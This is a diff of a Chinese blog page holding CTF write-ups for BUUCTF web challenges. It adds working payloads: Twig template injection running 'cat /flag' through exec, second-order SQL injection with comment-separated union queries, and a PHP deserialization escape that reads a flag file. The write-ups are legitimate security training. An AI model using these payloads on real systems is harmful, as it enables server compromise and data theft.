@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      4.7k 字
+      6.1k 字
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      72
+      91
        分钟
     </span>
   
@@ -241,12 +241,12 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：1 个月前
+                  本文最后更新于：5 分钟前
                 
               </p>
             
             <div class="markdown-body" id="post-body">
-              <p>这篇是buuctf上的其他题型的集合</p>
+              <p>buuctf上的其他题型的集合，懒得分类了</p>
 <h1 id="buuctf-z7z8"><a href="#buuctf-z7z8" class="headerlink" title="buuctf-z7z8"></a>buuctf-z7z8</h1><a id="more"></a>
 
 <h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
@@ -694,7 +694,8 @@ secert_key = os.urandom(<span class="hljs-number">16</span>)
 
 <p>在unicode中字符℀(U+2100)，当IDNA处理此字符时，会将℀变成a/c，因此当你访问此url时，dns服务器会自动将url重定向到另一个网站。如果服务器引用前端url时，只对域名做了限制，那么通过这种方法，我们就可以轻松绕过服务器对域名的限制了。</p>
 </blockquote>
-<p><img src="https://i.loli.net/2020/10/29/5ixom8Hq7UYdRBV.png" srcset="/img/loading.gif" alt="utf-8.png"></p>
+<img src="https://i.loli.net/2020/10/29/5ixom8Hq7UYdRBV.png" srcset="/img/loading.gif" alt="utf-8.png" style="zoom:50%;">
+
 <p>考察点2:</p>
 <blockquote>
 <p>Nginx服务器</p>
@@ -898,6 +899,121 @@ header(<span class="hljs-string">'Content-Type: text/html; charset=utf-8'</span>
 <p><strong>array_flip()</strong> 函数用于反转/交换数组中所有的键名以及它们关联的键值。</p>
 <p>array_flip() 函数返回一个反转后的数组，如果同一值出现了多次，则最后一个键名将作为它的值，所有其他的键名都将丢失。</p>
 <p>如果原数组中的值的数据类型不是字符串或整数，函数将报错。</p>
+<h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p>首先再hint.php中发现了提示</p>
+<p><img src="https://i.loli.net/2020/12/16/uw4fMRbPYv2oHti.png" srcset="/img/loading.gif" alt="image-20201216083026655"></p>
+<p>于是抓包看看cookie是啥，在flag.php页面随便登录后cookie后半段的值为用户名，尝试了sql注入，命令执行，都不是，于是试试了模板注入</p>
+<p>user={{2*4}}，出现下图的样子，说明了括号中的表达式被执行了，所以确定是模板注入</p>
+<p><img src="https://i.loli.net/2020/12/16/8irHUQKcXDZYMWv.png" srcset="/img/loading.gif" alt="image-20201216082222224"></p>
+<p>下面就是要找到读取flag的payload</p>
+<p>在网上找到了一个将模板注入说的很详细的博客，<a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#2-Twig" target="_blank" rel="noopener">传送门</a></p>
+<p>下面需要判断这个题目是哪个类型的模板，结合下面的图片做测试</p>
+<p><img src="https://i.loli.net/2020/12/16/GQid7jrR562I8te.png" srcset="/img/loading.gif" alt="image-20201216085015609"></p>
+<p><img src="https://i.loli.net/2020/12/16/9SZY8zLwvtDeiyT.png" srcset="/img/loading.gif" alt="image-20201216084914194"></p>
+<div class="hljs"><pre><code class="hljs angelscript">user=admin&#123;&#123;<span class="hljs-number">1</span>*<span class="hljs-number">2</span>&#125;&#125;*&#123;&#123;<span class="hljs-number">2</span>*<span class="hljs-number">3</span>&#125;&#125;</code></pre></div>
+
+<p>结果回显的是hellow admin2*6，正好是上面图片的第一种情况，所以就是Twig模板</p>
+<p>找到payload：</p>
+<div class="hljs"><pre><code class="hljs clojure">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="hljs-string">"exec"</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="hljs-string">"cat /flag"</span>)&#125;&#125;</code></pre></div>
+
+
+
+<p><img src="https://i.loli.net/2020/12/16/3TSMP4x7K5ujoYA.png" srcset="/img/loading.gif" alt="image-20201216084621589"></p>
+<p>参考:<a href="https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之SSTI漏洞/#2-Twig" target="_blank" rel="noopener">一篇文章带你理解漏洞之 SSTI 漏洞 | K0rz3n’s Blog</a></p>
+<h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>注册账号登录后，可以申请发布广告，在这个页面可以发现存在一个xxs，但是好像没法直接利用</p>
+<p><img src="/2020/10/08/buuoj-z7z8/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201216094058451.png" srcset="/img/loading.gif" alt="image-20201216094058451"></p>
+<p>测试是否存在sql注入</p>
+<p>在申请广告是输入标题<code>1&#39;111</code>，提交正常，但是当查看广告详情的时候出现了报错页面，这也说明了存在sql注入,而且是二次注入</p>
+<p><img src="/2020/10/08/buuoj-z7z8/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201216094728350.png" srcset="/img/loading.gif" alt="image-20201216094728350"></p>
+<h3 id="0x1sql注入"><a href="#0x1sql注入" class="headerlink" title="0x1sql注入"></a>0x1sql注入</h3><p>查看列数，空格是被加入了黑名单，使用/**/代替空格，一直加到了22才出现回显。</p>
+<div class="hljs"><pre><code class="hljs lsl"><span class="hljs-number">1</span>'<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span><span class="hljs-comment">/**/</span>'</code></pre></div>
+
+<p><img src="https://i.loli.net/2020/12/16/YLCR8ODt2wiSWfZ.png" srcset="/img/loading.gif" alt="image-20201216095035895"></p>
+<p>接下来就是查询库名，直接使用常规的查询方法会发现存在waf，无法使用，猜测可能是过滤or这个关键词，导致了information也被过滤了，那就换另外一种方法</p>
+<div class="hljs"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-built_in">table_name</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>sys.schema_auto_increment_colum
+ns<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema=<span class="hljs-keyword">schema</span>()</code></pre></div>
+
+<p>最后找到 了这个方法</p>
+<div class="hljs"><pre><code class="hljs lsl"><span class="hljs-number">1</span>'<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(select<span class="hljs-comment">/**/</span>group_concat(table_name)<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>mysql.innodb_table_stats),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span><span class="hljs-comment">/**/</span>'</code></pre></div>
+
+<p><img src="https://i.loli.net/2020/12/16/1e7KM9aCEkoI4GS.png" srcset="/img/loading.gif" alt="image-20201216101152422"></p>
+<p>接下来就是获取列名，但是常规的方法还是不能用，应为还是存在information</p>
+<p>那就使用一种新的查询方法，无列名查询</p>
+<p>刚开始以为flag放在FLAG_TABLE中，但是提示不存在这个表，又试了试users表，在第三列读到了flag</p>
+<p><img src="https://i.loli.net/2020/12/16/KiPL3omEjIanDcl.png" srcset="/img/loading.gif" alt="image-20201216103008504"></p>
+<p>一开始以为users表的结构是两列，但是注入时会报错，说明不是两列，测试三列时就正常了，说明时三列</p>
+<p><img src="https://i.loli.net/2020/12/16/Hm7NBTF32ED5gp4.png" srcset="/img/loading.gif" alt="image-20201216103553070"></p>
+<p>查到第三列的时候看到了flag,payload如下</p>
+<div class="hljs"><pre><code class="hljs lsl"><span class="hljs-number">1</span>'<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(select<span class="hljs-comment">/**/</span>group_concat(a)<span class="hljs-comment">/**/</span>from(select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">/**/</span>as<span class="hljs-comment">/**/</span>a<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span>*<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>users)b),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span><span class="hljs-comment">/**/</span>'</code></pre></div>
+
+
+
+<p>参考：<a href="https://www.jianshu.com/p/dc9af4ca2d06" target="_blank" rel="noopener">https://www.jianshu.com/p/dc9af4ca2d06</a></p>
+<h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+
+$function = @$_GET[<span class="hljs-string">'f'</span>];
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span><span class="hljs-params">($img)</span></span>&#123;
+    $filter_arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">'php'</span>,<span class="hljs-string">'flag'</span>,<span class="hljs-string">'php5'</span>,<span class="hljs-string">'php4'</span>,<span class="hljs-string">'fl1g'</span>);
+    $filter = <span class="hljs-string">'/'</span>.implode(<span class="hljs-string">'|'</span>,$filter_arr).<span class="hljs-string">'/i'</span>;
+    <span class="hljs-keyword">return</span> preg_replace($filter,<span class="hljs-string">''</span>,$img);
+&#125;
+
+<span class="hljs-keyword">if</span>($_SESSION)&#123;
+    <span class="hljs-keyword">unset</span>($_SESSION);
+&#125;
+$_SESSION[<span class="hljs-string">"user"</span>] = <span class="hljs-string">'guest'</span>;
+$_SESSION[<span class="hljs-string">'function'</span>] = $function;
+extract($_POST);
+
+<span class="hljs-keyword">if</span>(!$function)&#123;
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;
+&#125;
+
+<span class="hljs-keyword">if</span>(!$_GET[<span class="hljs-string">'img_path'</span>])&#123;
+    $_SESSION[<span class="hljs-string">'img'</span>] = base64_encode(<span class="hljs-string">'guest_img.png'</span>);
+&#125;<span class="hljs-keyword">else</span>&#123;
+    $_SESSION[<span class="hljs-string">'img'</span>] = sha1(base64_encode($_GET[<span class="hljs-string">'img_path'</span>]));
+&#125;
+
+$serialize_info = filter(serialize($_SESSION));
+
+<span class="hljs-keyword">if</span>($function == <span class="hljs-string">'highlight_file'</span>)&#123;
+    highlight_file(<span class="hljs-string">'index.php'</span>);
+&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($function == <span class="hljs-string">'phpinfo'</span>)&#123;
+    <span class="hljs-keyword">eval</span>(<span class="hljs-string">'phpinfo();'</span>); <span class="hljs-comment">//maybe you can find something in here!</span>
+&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($function == <span class="hljs-string">'show_image'</span>)&#123;
+    $userinfo = unserialize($serialize_info);
+    <span class="hljs-keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="hljs-string">'img'</span>]));
+&#125;</code></pre></div>
+
+<p>第33行代码提示了phpinfo中有隐藏的东西，GET提交<code>f=phpinfo</code>，会在里面找到一个文件的名字<strong>d0g3_f1ag.php</strong></p>
+<p>那么接下来的目的就是通过一些方法读取到里面的信息。可以看到最后一行存在一个 file_get_content函数，结合题目标题，可以猜到是反序列化加文件读取的题目。</p>
+<h3 id="0x1代码审计"><a href="#0x1代码审计" class="headerlink" title="0x1代码审计"></a>0x1代码审计</h3><p>代码最后一行有一个<code>file_get_contents</code>是能够读取文件的函数，他这里读取的是base64解密的’img’,往前找这个’img’，可以发现如果我们有传入img_path，它会经过sha1加密，导致目标路径失效。如果我们没有传入img_path，那么后台将默认赋值为guest_img.png的base64编码。这样看来这个<code>$userinfo[&#39;img&#39;]</code>并不是我们可控的，此时需要把注意力转移到另外一个函数serialize上，这里有一个很明显的漏洞点，数据经过序列化了之后又经过了一层过滤函数，就是数组里提到的<code>&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;</code>都会被空格替代，而这层过滤函数会干扰序列化后的数据。</p>
+<h3 id="0x2php反序列化字符逃逸"><a href="#0x2php反序列化字符逃逸" class="headerlink" title="0x2php反序列化字符逃逸"></a>0x2php反序列化字符逃逸</h3><p>利用过滤函数而导致序列化结果产生新的结果，之前写过类似的<a href="https://sunzy.icu/2020/11/17/UNCTF/" target="_blank" rel="noopener">文章</a></p>
+<p><img src="https://i.loli.net/2020/12/20/37JhPXH6GqbeuSI.png" srcset="/img/loading.gif" alt="image-20201220213459548"></p>
+<p>这里重新构造出的序列化值为：</p>
+<div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"user"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">24</span>:<span class="hljs-string">""</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">"function"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">59</span>:<span class="hljs-string">"a"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">"img"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">20</span>:<span class="hljs-string">"ZDBnM19mMWFnLnBocA=="</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">2</span>:<span class="hljs-string">"dd"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">1</span>:<span class="hljs-string">"a"</span>;&#125;</code></pre></div>
+
+<p>可以看到 真正的<code>$_SESSION[&quot;img&quot;]=&#39;L2QwZzNfZmxsbGxsbGFn&#39;;</code> 被抛弃掉了。这是因为我们在构造这段字符时是设计好长度的，<code>s:2:&quot;dd&quot;;s:1:&quot;a&quot;;}</code>，这里的 } 与之前的 { 闭合，让反序列提前结束，从而看到反序列化的内容为</p>
+<div class="hljs"><pre><code class="hljs cs">[<span class="hljs-meta"><span class="hljs-meta-string">"user"</span></span>]=&gt;
+<span class="hljs-keyword">string</span>(<span class="hljs-number">24</span>) <span class="hljs-string">""</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">"function"</span>;s:<span class="hljs-number">59</span>:<span class="hljs-string">"a"</span>
+[<span class="hljs-meta"><span class="hljs-meta-string">"img"</span></span>]=&gt;
+<span class="hljs-keyword">string</span>(<span class="hljs-number">20</span>) <span class="hljs-string">"ZDBnM19mMWFnLnBocA=="</span>
+[<span class="hljs-meta"><span class="hljs-meta-string">"dd"</span></span>]=&gt;
+<span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">"a"</span></code></pre></div>
+
+<p>根据上面的构造方法，那么就可以将img字段的值改为phpinfo中给的文件名的base64值，从而读取其内容</p>
+<p>构造payload</p>
+<div class="hljs"><pre><code class="hljs php">get:f=show_image
+post:_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="hljs-function"><span class="hljs-keyword">function</span>]=<span class="hljs-title">a</span>"</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">"img"</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">"ZDBnM19mMWFnLnBocA=="</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">"dd"</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">"a"</span>;&#125;</code></pre></div>
+
+<p><img src="https://i.loli.net/2020/12/20/ESz2xIZWJD8j7Rk.png" srcset="/img/loading.gif" alt="image-20201220213803529"></p>
+<p>提示了flag在这个文件中，那就将上面的img字段值换成这个文件名的base64值</p>
+<div class="hljs"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">base64</span><span class="hljs-params">(/d0g3_fllllllag)</span></span> = L2QwZzNfZmxsbGxsbGFn</code></pre></div>
+
+<p>payload:</p>
+<div class="hljs"><pre><code class="hljs pgsql"><span class="hljs-keyword">get</span>:f=show_image		post:_SESSION[<span class="hljs-keyword">user</span>]=flagflagflagflagflagflag&amp;_SESSION[<span class="hljs-keyword">function</span>]=a";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";s:2:"dd";s:1:"a";&#125;</code></pre></div>
+
 
             </div>
             <hr>
